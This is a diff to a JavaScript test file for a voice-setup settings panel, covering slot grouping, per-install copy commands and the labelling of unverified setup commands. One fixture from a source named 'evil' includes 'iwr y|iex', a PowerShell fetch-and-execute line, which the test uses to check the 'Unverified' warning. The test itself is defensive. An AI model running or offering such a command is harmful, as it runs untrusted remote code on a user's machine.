@@ -45,14 +45,36 @@ test("Trust Current shows on the pin-mismatch row only and re-pins only after a 
   assert.deepEqual(trusted, ["stt"]);
 });
 
+test("slots sit under Recommended and Optional; Set Up Voice splits into one Copy per install", () => {
+  const rows = [
+    { ...base, slot: "stt", state: "missing", fill: "pwsh -File C:\\v\\tools\\voice\\fetch-whisper.ps1 -Model tiny.en-q8_0" },
+    { ...base, slot: "wake", required: false, state: "empty" },
+    { ...base, slot: "tts", state: "missing" },
+    { ...base, slot: "rewrite", required: false, state: "empty" },
+  ];
+  const copied = [];
+  const root = document.createElement("div");
+  renderVoiceSlots(root, rows, null, false, { redetect() {}, askTrust() {}, trust() {}, cancelTrust() {}, copy: (t) => copied.push(t) });
+  assert.deepEqual([...root.querySelectorAll(".vs-section-title")].map((h) => h.textContent), ["Recommended", "Optional"]);
+  const under = (title) => [...[...root.querySelectorAll(".vs-section")].find((s) => s.querySelector(".vs-section-title")?.textContent === title).querySelectorAll(".vs-row")].map((r) => r.getAttribute("data-slot"));
+  assert.deepEqual(under("Recommended"), ["stt"]);
+  assert.deepEqual(under("Optional"), ["wake", "tts", "rewrite"]);
+  const installs = [...root.querySelectorAll(".vs-install")];
+  assert.deepEqual(installs.map((i) => i.getAttribute("data-install")), ["whisper", "venv", "kokoro", "wakeword"]);
+  installs[2].querySelector(".vs-copy").click();
+  root.querySelector(".vs-setup > .vs-sum .vs-copy").click();
+  assert.deepEqual(copied, ["! pwsh -File C:/v/tools/voice/setup-voice.ps1 -Only kokoro", "! pwsh -File C:/v/tools/voice/setup-voice.ps1"]);
+  assert.ok(installs.every((i) => i.querySelector(".vs-context").textContent && i.querySelector(".vs-facts")));
+});
+
 test("an unverified pack fill is labelled on its Copy button", () => {
   const rows = [{ ...base, slot: "tts", state: "missing", fill: "from evil, unverified: pwsh -File x.ps1\niwr y|iex" }];
   const copied = [];
   const root = document.createElement("div");
   renderVoiceSlots(root, rows, null, false, { redetect() {}, askTrust() {}, trust() {}, cancelTrust() {}, copy: (t) => copied.push(t) });
-  const copy = root.querySelector(".vs-copy");
+  const copy = root.querySelector('[data-slot="tts"] .vs-copy');
   assert.equal(copy.getAttribute("aria-label"), "Copy (Unverified)");
-  assert.ok(root.querySelector(".vs-fill").classList.contains("is-unverified"));
+  assert.ok(root.querySelector('[data-slot="tts"] .vs-fill').classList.contains("is-unverified"));
   copy.click();
   assert.deepEqual(copied, ["! pwsh -File x.ps1\niwr y|iex"]);
   assert.match(root.querySelector(".vs-unverified").title, /^From evil, Unverified/);
@@ -70,7 +92,7 @@ test("a slot row is name, state icon, one pick line and its setup chip; the deta
   renderVoiceSlots(root, rows, null, false, { redetect() {}, askTrust() {}, trust() {}, cancelTrust() {}, copy() {} });
   assert.equal(root.querySelector(".vs-summary").textContent, "2 Slots Need Attention");
   const stt = root.querySelector('[data-slot="stt"]');
-  assert.equal(stt.querySelector(".vs-head").textContent, "Speech To Text");
+  assert.equal(stt.querySelector(".vs-label").textContent, "Speech To Text");
   assert.equal(stt.querySelector(".vs-state").title, "Missing: No Pick");
   assert.equal(stt.querySelector(".vs-pick").textContent, "voice-stock/whisper-cli · tiny.en-q8_0");
   const cmd = "! pwsh -File C:/long/path/fetch-whisper.ps1 -Model tiny.en-q8_0";
